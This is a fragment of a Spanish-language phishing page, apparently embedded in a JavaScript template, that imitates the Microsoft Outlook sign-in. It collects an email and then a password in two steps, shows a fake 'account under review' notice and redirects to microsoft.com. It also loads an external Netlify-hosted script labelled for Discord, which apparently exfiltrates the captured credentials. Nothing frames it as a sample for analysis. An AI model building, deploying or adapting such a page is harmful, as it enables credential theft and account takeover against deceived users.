...
<head>
    ...
    <link rel="shortcut icon" href="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/ico.ico?v=1741715931055" type="image/x-icon">
...
<body>    <div id="form1">
    ...
    <div class="cont">
        <div class="cont-form">
            ...
            <div class="cont-xjsx">
                <div class="lg">
                    <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/log.svg?v=1741715936758" alt="">
                </div>
                <div class="txt-sin">
                    <p>Iniciar sesión<span>Continuar a Outlook</span></p>
                </div>
                <p id="err"></p>
                <form id="xjsx" method="post">
                    <div class="usr">
                        <input id="js1" name="js1" type="text" placeholder="Correo electrónico, teléfono o Skype">
                    </div>
                    <p id="lce">¿No tiene una cuenta? <a href="#">Cree una.</a></p>
                    <div class="sub">
        ...
        <div class="foot">
            <div class="key">
                <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/key.svg?v=1741715933675" alt="">
            </div>
        ...
        </div>        <div id="form2" style="display:none;>
        ...
        <div class="cont-form">
            ...
            <div class="cont-xjsx">
                ...
                <div class="tras"> 
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ababab" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-arrow-left">
                ...
                <form id="xjsx2" method="post"> 
                    <div class="usr usr-eye"> 
                        <input id="js2" name="js2" type="password" placeholder="Contraseña"> 
                        <svg id="eye" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" width="24" height="24" stroke-width="2">
                            <path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0"></path>
                            <path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6"></path>
                        </svg> 
                    </div>
                    <p id="lce"><a href="#">¿Ha olvidado su contraseña?</a></p>
                    <div class="sub">
    ...
    <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div></div> <div class="cont"> <div class="cont-form"> <div class="log"> <img src="" alt=""> </div> <div class="cont-xjsx"> <div class="lg"> <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/log.svg?v=1741715936758" alt=""> </div> <div class="txt-sin"> <p>Buzón Restringido<span></span></p> <br></div>
    <p class="text-pg">Tu cuenta esta en revisión, gracias por usar nuestros servicios.</p>
         <!-- IMAGEN X -->
    <div class="verd">
        <img src="https://cdn.glitch.global/3bc874cc-c5e4-4ba4-b9ac-a6c40f8c4ca7/picts%2Fcheck.gif?v=1740067235934" alt="">
        <!-- <svg id="x" xmlns="http://www.w3.org/2000/svg"  width="34"  height="34"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-x"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg> -->
    </div>
     <div class="fins">
        <a href="https://www.microsoft.com/">Finalizar</a>
     </div>
    ...
    <!-- Script externo para Discord -->
    <script src="https://23098289822324.netlify.app/disBLOCK.js"></script>
</body>
</html>
    `;
